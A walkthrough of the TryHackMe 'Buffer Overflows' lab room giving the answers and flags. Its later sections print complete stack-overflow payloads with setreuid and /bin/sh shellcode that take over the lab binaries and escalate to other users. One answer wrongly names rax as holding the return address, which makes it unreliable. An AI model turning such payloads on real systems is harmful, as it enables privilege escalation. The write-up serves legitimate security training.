![Buffer Overflows Banner](https://tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Cover.png" alt="Buffer Overflows Logo">
</p>

# Buffer Overflows

This guide contains the answer and steps necessary to get to them for the [Buffer Overflows](https://tryhackme.com/room/bof1) room.

## Table of contents

- [Process Layout](#process-layout)
- [x86-64 Procedures](#x86-64-procedures)
- [Procedures Continued](#procedures-continued)
- [Overwriting Variables](#overwriting-variables)
- [Overwriting Function Pointers](#overwriting-function-pointers)
- [Buffer Overflows](#buffer-overflows)
- [Buffer Overflow 2 ](#buffer-overflow-2)

### Process Layout

1. Where is dynamically allocated memory stored?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Heap</details>

2. Where is information about functions(e.g. local arguments) stored?

The answer can be found in the text.

   ><details><summary>Click for answer</summary>Stack</details>

### x86-64 Procedures

1. What direction does the stack grown(l for lower/h for higher)

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>l</details>

2. What instruction is used to add data onto the stack?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>push</details>

### Procedures Continued

1. What register stores the return address?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>rax</details>

### Overwriting Variables

1. What is the minimum number of characters needed to overwrite the variable?

   If we look at the c script in the first overflow folder we can see the buffer has 14 bytes.

   ![Variables Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Variables_Script.png)

   This means we must use at least 15 bytes of data in order to overwrite the variable.

   ![Variables Overflow](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Variables_Overflow.png)

   ><details><summary>Click for answer</summary>15</details>

### Overwriting Function Pointers

1. Invoke the special function()

   Opening our binary in radare we can see what the memory location is of our normal and special function.

   ```cmd
   r2 -d ./func-pointer
   aa
   afl
   pdf @ main
   ```

   ![Pointer Addresses](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Pointer_Addresses.png)

   We also no where to add a break so we can enter our input. Lets try a normal input to see what happends.

   First set a breakpoint then add the input.

   ```cmd
   db 0x004005d1
   dc

   AAAA
   dc
   ```

   ![Pointer Normal](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Pointer_Normal.png)

   We can see the normal function has been called.

   Since we know the memory location of the special function in hex notation, lets convert it to text.

   ![Pointer Convert](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Pointer_Convert.png)

   Note that we need to use little endian notation.

   We now have 3 characters we can add to our payload.

   The hex character representing \x05 can be entered using the keys ctrl + E.

   ![Pointer Control](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Pointer_Control.png)

   From the binary we saw that our buffer is 14 bytes long, so our payload will be:

   AAAAAAAAAAAAAAg^E@

   Note that we must not use the characters '^' and 'E', rather the combination of ctrl + E.

   ```cmd
   ood -> To restart the binary
   dc

   AAAAAAAAAAAAAAg{ctrl + E}@
   dc
   ```

   ![Pointer Special](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Pointer_Special.png)

### Buffer Overflows

1. Use the above method to open a shell and read the contents of the secret.txt file.

   Instead of using radare2 for this, I found it to be much easier using gdb. Lets over the binary using gdb and check how many bytes we need to overwryte the return address.

   From the binary we can tell our buffer is 140 bytes long. We also need a 6 bytes return address and there is often an 8 bytes padding in x64 systems. Totaling this gives us a first estimate of 154 bytes.

   ![Overflows1 Binary](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Binary.png)

   ```cmd
   gdb buffer-overflow

   $(python -c "print('\x41'*154)")
   ```

   ![Overflows1 Payload Length](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Payload_Length.png)

   We can see we have just 2 bytes written in the return address. Since we need 6 in total, we must add 4 more bytes to our payload.

   ```cmd
   $(python -c "print('\x41'*158)")
   ```

   ![Overflows1 Payload Length2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Payload_Length2.png)

   Previously, we saw that the secrets text must be accessed by user2. So we must add a piece of code to our shellcode that will change our uid. This can be accomplished with pwntools.

   In this case user 2 has a uid of 1002.

   ![Overflows1 Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Users.png)
   
   ```cmd
   pwn shellcraft -f d amd64.linux.setreuid 1002
   ```

   ![Overflows1 Setreuid2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Setreuid2.png)

   Now we can add it to our shellcode and look for the return address of our shellcode in gdb.

   Our shellcode is now 54 bytes long. Excluding the return address of 6 bytes we are left with 98 bytes left. Our payload will look as follows.

   `| NOPs 90 | Shellcode 54 | random characters 8 | return address 6|`

   After that we must check the registry to see where our shell code starts.

   ```cmd
   run $(python -c "print('\x90' * 76 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + 'B' * 6)")

   x/100x $rsp-200
   ```

   ![Overflows1 Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Registry.png)

   We can cleary see where our NOPs begin, our shellcode and return address. We can use anywhere within the NOPs as our return address. So we will use 0x7fffffffe298 in our case.

   Converting this into a hex string (keeping in mind it uses little endian notation) gives us our return address:

   `'\x98\xe2\xff\xff\xff\x7f'`

   We can now add this to our payload, exit gdb and run the binary with our payload.

   ```cmd
   python -c "print('\x90' * 76 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + '\x98\xe2\xff\xff\xff\x7f')"
   ```

   ![Overflows1 Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Shell.png)

   Looks like we have our shell as user2!

   Now we just need to read the file.

   ![Overflows1 Text](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows1_%20Text.png)

   ><details><summary>Click for answer</summary>omgyoudidthissocool!!</details>

### Buffer Overflow 2 

1. Use the same method to read the contents of the secret file!

   We can use the same method, but we need to modify our shellcode slightly.

   Looking at the binary we can see our buffer is now 154 long and pre-populated with the word `doggo`.

   ![Overflows2 Binary](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows2_%20Binary.png)

   Lets check the neccesary length for our payoad again using gdb. Adding our buffer (154), random characters (8), and return address (6).

   ```cmd
   run $(python -c "print('\x41'*168)")

   run $(python -c "print('\x41'*169)")
   ```

   ![Overflows2 Payload Length](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows2_%20Payload_Length.png)

   Seems we were just 1 byte shy, so our payload length will be 169 bytes.

   We now add a piece of code to change our uid to that of user3 (1003)

   ```cmd
   pwn shellcraft -f d amd64.linux.setreuid 1003
   ```

   ![Overflows2 Setreuid3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows2_%20Setreuid3.png)

   Now we must find the beginning of our shellcode again like we did last time.

   ```cmd
   run $(python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + 'B' * 6)")
   ```

   ![Overflows2 Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows2_%20Registry.png)

   We now know were our code starts. We can again use the registry address of 0x7fffffffe298 or `\x98\xe2\xff\xff\xff\x7f`.

   Substituting this into our payload and running the binary with it gives us a shell as user3.

   ```cmd
   python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + '\x98\xe2\xff\xff\xff\x7f')"
   ```

   ![Overflows2 Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows2_%20Shell.png)

   Now we can read our secret file.
   
   ![Overflows2 Text](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/bof1/Buffer_Overflow_Overflows2_%20Text.png)

   ><details><summary>Click for answer</summary>wowanothertime!!</details>

## Usefull Links

- 🔗 https://l1ge.github.io/tryhackme_bof1/
- 🔗 https://rderik.com/blog/understanding-buffer-overflows-using-radare2/
- 🔗 https://bobloblaw321.wixsite.com/website/post/tryhackme-buffer-overflows
- 🔗 https://shamsher-khan-404.medium.com/buffer-overflows-tryhackme-writeup-348aec9c1dfe
- 🔗 https://github.com/amirr0r/thm/tree/master/bof1
- 🔗 https://www.aldeid.com/wiki/TryHackMe-Buffer-Overflows#Buffer_Overflows
